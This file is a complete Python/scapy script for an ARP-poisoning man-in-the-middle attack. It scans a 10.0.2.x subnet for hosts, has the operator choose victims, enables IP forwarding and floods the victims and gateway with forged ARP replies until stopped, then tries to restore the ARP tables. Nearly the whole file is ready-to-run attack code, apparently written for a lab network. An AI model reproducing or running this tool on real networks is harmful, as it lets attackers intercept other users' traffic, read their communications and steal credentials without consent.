import sys
from scapy.all import *
from threading import Thread

conf.verb = 0
GATEWAY_IP = "10.0.2.2"

#Gets the mac address for a given ip_address and adds it to the passed in results
def get_mac_address(ip_address, results):
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=0, timeout=0)
    for send, rec in resp:
        results.append((rec[ARP].hwsrc, rec[ARP].psrc))

#Lists out the available addresses found on the network and returns the gateway and victim ip/mac information
def get_addresses():
    print("Finding MAC addresses...")
    results = []
    threads = []
    #Probe the network to get a list of the available IP addresses to attack
    for i in range(2, 256):
        dest = "10.0.2." + str(i)
        thread = Thread(target=get_mac_address, args=(dest, results))
        thread.start()
        threads.append(thread)
        
    #Wait for the threads to finish up their arp requests
    for thread in threads:
        thread.join()

    selections = []
    #Set the first array item to be the gateway
    for address in results:
        if address[1] == GATEWAY_IP:
            selections.append(address)
            results.remove(address)
            break

    if len(selections) != 1:
        print("Could not find the gateway's MAC address, exiting...")
        sys.exit(1)

    #Print the results of the found IP addresses
    print("Results: ")
    for i, result in enumerate(results):
        print(str(i + 1) + ". MAC --> " + result[0] + " | IP --> " + result[1])

    #Prompt the user to select an IP address to attack
    print("\nSelect from results the MAC/IP address(es) you wish to attack.")
    print("Enter one selection per line and to begin the attack press enter.\n")
    while True:
        selection = raw_input("Selection: ")
        try:
            if selection == '':
                break
            elif int(selection) < 1 or int(selection) > len(results):
                print("Invalid number, try again.")
            else:
                selections.append(results[int(selection) - 1])
        except:
            print("Invalid selection, try again.")
            
    return selections

#Sends arp reply packets to poison the victim and gateway
def poison(gateway, victims):
    gate_mac = gateway[0]
    gate_ip = gateway[1]
    for address in victims:
        vic_mac = address[0]
        vic_ip = address[1]
        send(ARP(op = 2, pdst = gate_ip, hwdst = gate_mac, psrc = vic_ip))
        send(ARP(op = 2, pdst = vic_ip, hwdst = vic_mac, psrc = gate_ip))

#Sends arp reply packets to reverse the poisoning on the network
def unpoison(gateway, victims):
    gate_mac = gateway[0]
    gate_ip = gateway[1]
    #Send reply packets for each victim
    for address in victims:
        vic_mac = address[0]
        vic_ip = address[1]
        for i in range(2):
            send(ARP(op = 2, pdst = gate_ip, psrc = vic_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = vic_mac), count = 1)
            send(ARP(op = 2, pdst = vic_ip, psrc = gate_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gate_mac), count = 1)
            time.sleep(1)

#Launches the arp attack against the passed in gateway and victim devices
def attack(gateway, victims):
    try:
        #Send ARP replys until the user cancels program execution [ex: with ctrl-c]
        print("Arp poisoning...")
        while True:
            poison(gateway, victims)
            time.sleep(2)
            print("Still poisoning...")
    except KeyboardInterrupt:
        print("\nUnpoisoning...")
        # Disable IP forwarward
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

        # Unpoison the ARP table
        unpoison(gateway, victims)

if __name__ == '__main__':
    #Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    #Get the IP addresses to attack
    addresses = get_addresses()

    #Run the arp attack
    gateway = addresses.pop(0)
    attack(gateway, addresses)